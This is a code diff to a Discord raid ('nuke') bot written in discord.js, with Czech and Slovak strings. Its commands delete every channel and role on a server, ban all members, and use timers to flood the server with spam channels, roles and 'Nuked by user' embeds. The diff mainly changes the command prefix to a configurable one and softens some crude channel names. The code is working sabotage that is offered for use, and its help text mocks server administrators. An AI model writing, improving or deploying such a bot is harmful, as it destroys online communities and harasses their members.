@@ -1,5 +1,6 @@
 const Discord = require('discord.js')
 const bot = new Discord.Client();
+const prefix = '!';
 
 bot.on('ready', () => {
     console.log(`${bot.user.tag} je to ready!`)
@@ -12,44 +13,44 @@ bot.on('message', message => {
          }),
       1
     }
-    if(message.content === "x.nuke") {
+    if(message.content === prefix + ".nuke") {
  message.channel.send("Nyní se maže vše")
 	 message.guild.channels.forEach(channel => channel.delete())
 	 message.guild.roles.forEach(roles => roles.delete()) } 
 	  
-    if(message.content === 'x.create') {
+    if(message.content === prefix + '.create') {
       setInterval(function() {
-      message.guild.createChannel('PICUSOVIA', 'text')
-      message.guild.createChannel('TENHLE SERVER JE KOKOTINA', 'voice')
-      message.guild.createChannel('IG - pes_adam', 'category')
+      message.guild.createChannel('text-text-text', 'text')
+      message.guild.createChannel('hahahhaha', 'voice')
+      message.guild.createChannel('sleduj ma na IG - pes_adam', 'category')
     }),
     1
   }
-  if(message.content === 'x.createroles') {
+  if(message.content === prefix + '.createroles') {
     setInterval(function() {
         message.guild.createRole({
-           name: "troll role",
+           name: "troll",
            color: 'RANDOM'
         })
       }),
       1
     }
-  if(message.content === 'x.deleteroles') {
+  if(message.content === prefix + '.deleteroles') {
     message.guild.roles.forEach(role => role.delete())
   }
-  if(message.content === 'x.deletechannels') {	
+  if(message.content === prefix + '.deletechannels') {	
      message.guild.channels.forEach(channel => channel.delete())
   }
-  if(message.content === 'x.banall') {
+  if(message.content === prefix + '.banall') {
     message.guild.members.forEach((f) => {
       message.guild.member(f).ban('hahahah')
     })
   }
   bot.on('message', message => {
-if(message.content === 'x.spam') {
+if(message.content === prefix + '.spam') {
 	setInterval(function() {
   const spam = new Discord.RichEmbed()
-  .setTitle("Nuked by pes")
+  .setTitle("Nuked by user")
   .addField('LOL', true)
   .setColor("RANDOM")
   message.channel.send(spam)
@@ -57,17 +58,17 @@ if(message.content === 'x.spam') {
       1
     }
 })
-  if(message.content === 'x.help') {
+  if(message.content === prefix + '.help') {
   const xhelp = new Discord.RichEmbed()
   .setTitle("ALL COMMANDS")
-  .addField('Info Commands', '```x.info```', true)
-  .addField('Raid Commands', '```x.nuke, x.deleteroles, x.create, x.deletechannels, x.banall```', true)
-  .addField('Other Commands', '```x.spam```', true)
+  .addField('Info Commands', '```!.info```', true)
+  .addField('Raid Commands', '```!.nuke, !.deleteroles, !.create, !.deletechannels, !.banall```', true)
+  .addField('Other Commands', '```!.spam```', true)
   .setFooter("Thanks for administrator dumbasses")
   .setColor("RANDOM")
   message.channel.send(xhelp)
   }
-  if(message.content === 'x.info') {
+  if(message.content === '!.info') {
   const xinfo = new Discord.RichEmbed()
   .setTitle("Informations")
   .setDescription("**FOLOW TO MY IG - pes_adam**")
